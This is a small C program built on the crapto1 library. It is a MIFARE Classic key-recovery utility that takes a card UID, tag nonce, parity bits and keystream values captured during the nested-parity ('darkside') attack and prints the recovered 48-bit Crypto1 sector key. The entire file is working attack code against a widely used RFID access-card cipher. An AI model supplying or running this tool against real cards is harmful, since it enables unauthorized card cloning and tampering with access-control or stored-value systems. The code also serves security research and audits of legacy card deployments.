#include "crapto1.h"
#define __STDC_FORMAT_MACROS
#include <inttypes.h>
#define llx PRIx64
#include <stdio.h>
typedef unsigned char byte_t;

int main(const int argc, const char* argv[]) {
  struct Crypto1State *state;
  uint32_t pos, uid, nt, nr, rr, nr_diff, ks1, ks2;
  byte_t bt, i, ks3x[8], par[8][8];
  uint64_t key, key_recovered;
  uint64_t par_info;
  uint64_t ks_info;
  nr = rr = 0;
  
  if (argc < 5) {
    printf("\nsyntax: %s <uid> <nt> <par> <ks>\n\n",argv[0]);
    return 1;
  }
  sscanf(argv[1],"%08x",&uid);
  sscanf(argv[2],"%08x",&nt);
  sscanf(argv[3],"%016"llx,&par_info);
  sscanf(argv[4],"%016"llx,&ks_info);
  
  // Reset the last three significant bits of the reader nonce
  nr &= 0xffffff1f;
  
  printf("\nuid(%08x) nt(%08x) par(%016"llx") ks(%016"llx")\n\n",uid,nt,par_info,ks_info);

  for (pos=0; pos<8; pos++)
  {
    ks3x[7-pos] = (ks_info >> (pos*8)) & 0x0f;
    bt = (par_info >> (pos*8)) & 0xff;
    for (i=0; i<8; i++)
    {
      par[7-pos][i] = (bt >> i) & 0x01;
    }
  }

  printf("|diff|{nr}    |ks3|ks3^5|parity         |\n");
  printf("+----+--------+---+-----+---------------+\n");
  for (i=0; i<8; i++)
  {
    nr_diff = nr | i << 5;
    printf("| %02x |%08x|",i << 5, nr_diff);
    printf(" %01x |  %01x  |",ks3x[i], ks3x[i]^5);
    for (pos=0; pos<7; pos++) printf("%01x,",par[i][pos]);
    printf("%01x|\n",par[i][7]);
  }
  
  state = lfsr_common_prefix(nr,rr,ks3x,par);
  lfsr_rollback_word(state,uid^nt,0);
  crypto1_get_lfsr(state,&key_recovered);
  printf("\nkey recovered: %012"llx"\n\n",key_recovered);
  crypto1_destroy(state);
  
  return 0;
}
